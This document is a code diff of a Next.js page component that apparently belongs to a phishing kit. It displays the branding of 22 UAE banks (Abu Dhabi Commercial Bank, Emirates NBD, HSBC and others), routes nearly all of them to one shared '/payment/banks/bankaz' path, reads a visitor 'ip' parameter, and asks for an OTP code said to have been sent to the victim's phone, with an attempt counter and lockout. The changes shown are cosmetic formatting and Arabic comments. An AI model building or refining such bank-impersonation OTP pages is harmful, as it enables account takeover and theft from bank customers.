@@ -21,28 +21,28 @@ export default function OTPContent() {
     const ip = searchParams.get('ip');
 
     const banks = [
-        { id: 1, name: 'بنك أبو ظبي التجاري', src: '/b-abodabetgare.jfif',url:'/payment/banks/bankaz' },
-        { id: 2, name: 'بنك أبو ظبي الأول', src: '/b-abodabeone.jpg',url:'/payment/banks/bankaz'},
-        { id: 3, name: 'بنك الإمارات الإسلامي', src: '/b-emaratislam.png',url:'/payment/banks/bankaz' },
-        { id: 4, name: 'بنك الإمارات دبي الوطني', src: '/b-emaratdubaiwatne.jpg',url:'/payment/banks/bankaz' },
-        { id: 5, name: 'بنك دبي التجاري', src: '/b-dubaitgare.jpg',url:'/payment/banks/bankaz' },
-        { id: 6, name: 'بنك أبو ظبي الإسلامي', src: '/b-abodabeislam.jpg',url:'/payment/banks/bankaz' },
-        { id: 7, name: 'بنك المشرق', src: '/b-mahrok.png',url:'/payment/banks/bankaz'  },
-        { id: 8, name: 'بنك دبي الإسلامي', src: '/b-dubaiislam.jpg',url:'/payment/banks/bankaz'  },
-        { id: 9, name: 'HSBC بنك', src: '/bhsbc.png',url:'/payment/banks/bankaz'  },
-        { id: 10, name: 'مصرف الشارقة الإسلامي', src: '/msrfsharka.jfif',url:'/payment/banks/bankaz' },
-        { id: 11, name: 'بنك رأس الخيمة الوطني', src: '/b-raskema.gif',url:'/payment/banks/bankaz' },
-        { id: 12, name: 'بنك الفجيرة الوطني', src: '/b-fgerwatny.jpg',url:'/payment/banks/bankaz' },
-        { id: 13, name: 'بنك الاستثمار', src: '/bank-investment.jpg',url:'/payment/banks/bankaz' },
-        { id: 14, name: 'بنك أم القيوين الوطني', src: '/b.jpg',url:'/payment/banks/bankaz' },
-        { id: 15, name: 'بنك الماريا المحلي', src: '/bmarea.jpg',url:'/payment/banks/bankaz' },
-        { id: 16, name: 'بنك الهلال', src: '/bank-hilal.jpg',url:'/payment/banks/bankaz' },
-        { id: 17, name: 'Wio Bank', src: '/wiob.webp',url:'/payment/bankaz' },
-        { id: 18, name: 'المصرف', src: '/bank-al-masraf.jpg',url:'/payment/banks/bankaz' },
-        { id: 19, name: 'بنك عجمان', src: '/bajman.jpg',url:'/payment/bankaz' },
-        { id: 20, name: 'بنك الشارقة', src: '/bank-sharjah.jpg',url:'/payment/banks/bankaz' },
-        { id: 21, name: 'Liv X', src: '/livexb.jfif',url:'/payment/banks/bankaz' },
-        { id: 22, name: 'Zand Bank', src: '/bank-zand.jpg',url:'/payment/banks/bankaz' }
+        { id: 1, name: 'بنك أبو ظبي التجاري', src: '/b-abodabetgare.jfif', url: '/payment/banks/bankaz' },
+        { id: 2, name: 'بنك أبو ظبي الأول', src: '/b-abodabeone.jpg', url: '/payment/banks/bankaz' },
+        { id: 3, name: 'بنك الإمارات الإسلامي', src: '/b-emaratislam.png', url: '/payment/banks/bankaz' },
+        { id: 4, name: 'بنك الإمارات دبي الوطني', src: '/b-emaratdubaiwatne.jpg', url: '/payment/banks/bankaz' },
+        { id: 5, name: 'بنك دبي التجاري', src: '/b-dubaitgare.jpg', url: '/payment/banks/bankaz' },
+        { id: 6, name: 'بنك أبو ظبي الإسلامي', src: '/b-abodabeislam.jpg', url: '/payment/banks/bankaz' },
+        { id: 7, name: 'بنك المشرق', src: '/b-mahrok.png', url: '/payment/banks/bankaz' },
+        { id: 8, name: 'بنك دبي الإسلامي', src: '/b-dubaiislam.jpg', url: '/payment/banks/bankaz' },
+        { id: 9, name: 'HSBC بنك', src: '/bhsbc.png', url: '/payment/banks/bankaz' },
+        { id: 10, name: 'مصرف الشارقة الإسلامي', src: '/msrfsharka.jfif', url: '/payment/banks/bankaz' },
+        { id: 11, name: 'بنك رأس الخيمة الوطني', src: '/b-raskema.gif', url: '/payment/banks/bankaz' },
+        { id: 12, name: 'بنك الفجيرة الوطني', src: '/b-fgerwatny.jpg', url: '/payment/banks/bankaz' },
+        { id: 13, name: 'بنك الاستثمار', src: '/bank-investment.jpg', url: '/payment/banks/bankaz' },
+        { id: 14, name: 'بنك أم القيوين الوطني', src: '/b.jpg', url: '/payment/banks/bankaz' },
+        { id: 15, name: 'بنك الماريا المحلي', src: '/bmarea.jpg', url: '/payment/banks/bankaz' },
+        { id: 16, name: 'بنك الهلال', src: '/bank-hilal.jpg', url: '/payment/banks/bankaz' },
+        { id: 17, name: 'Wio Bank', src: '/wiob.webp', url: '/payment/bankaz' },
+        { id: 18, name: 'المصرف', src: '/bank-al-masraf.jpg', url: '/payment/banks/bankaz' },
+        { id: 19, name: 'بنك عجمان', src: '/bajman.jpg', url: '/payment/bankaz' },
+        { id: 20, name: 'بنك الشارقة', src: '/bank-sharjah.jpg', url: '/payment/banks/bankaz' },
+        { id: 21, name: 'Liv X', src: '/livexb.jfif', url: '/payment/banks/bankaz' },
+        { id: 22, name: 'Zand Bank', src: '/bank-zand.jpg', url: '/payment/banks/bankaz' }
     ];
 
     const selectedBank = banks[Number(bankId) - 1] || banks[0];
@@ -107,6 +107,7 @@ export default function OTPContent() {
     return (
         <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
             <div className="z-10 w-full max-w-md mx-auto">
+                {/* البطاقة العلوية */}
                 <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
                     <div className="w-20 h-20 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center mb-4">
                         <Image
@@ -128,6 +129,7 @@ export default function OTPContent() {
                     </p>
                 </div>
 
+                {/* نموذج OTP */}
                 <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
                     <h1 className='text-[#008000] text-lg font-bold text-center mb-4'>
                         المصادقة عبر {selectedBank?.name || 'البنك'}
@@ -137,6 +139,7 @@ export default function OTPContent() {
                         تم إرسال رمز OTP إلى هاتفك
                     </p>
 
+                    {/* عرض المحاولات المتبقية */}
                     <div className="text-center mb-4">
                         {!isLocked ? (
                             <p className="text-sm text-gray-500">
@@ -202,4 +205,4 @@ export default function OTPContent() {
             </div>
         </main>
     );
-    }
+}
